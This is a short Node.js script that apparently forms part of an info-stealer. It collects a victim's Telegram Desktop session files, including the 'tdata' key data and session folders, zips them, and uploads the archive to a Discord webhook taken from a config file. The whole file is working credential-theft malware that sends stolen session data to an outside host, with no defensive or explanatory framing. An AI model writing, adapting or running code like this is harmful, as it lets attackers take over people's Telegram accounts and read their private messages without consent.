const fs = require("fs");
const AdmZip = require("adm-zip");
const Webhook = require("discord-webhook-node").Webhook;
const path = require("path");

const telegramDir = path.join(process.env.USERPROFILE, "AppData", "Roaming", "Telegram Desktop", "tdata");
const outputDir = path.join(process.env.USERPROFILE, "AppData", "Local");
const files = [
  "D877F783D5D3EF8C",
  "89C797EA40C6DC89s",
  "479FBDE978610A0As",
  "countries",
  "key_datas",
  "prefix",
  "settingss",
  "shortcuts-custom.json",
  "shortcuts-default.json",
  "usertag"
];

const zip = new AdmZip();
files.forEach(file => {
  const filePath = path.join(telegramDir, file);
  if (fs.existsSync(filePath)) {
    if (fs.statSync(filePath).isFile()) {
      zip.addLocalFile(filePath);
    } else {
      zip.addLocalFolder(filePath, file);
    }
  }
});

zip.writeZip(path.join(outputDir, "telegram_data.zip"));

const config = require("../config.json");

async function sendZipFile() {
  const webhook = new Webhook(config.webhook);
  await webhook.sendFile(path.join(outputDir, "telegram_data.zip"));
}

sendZipFile();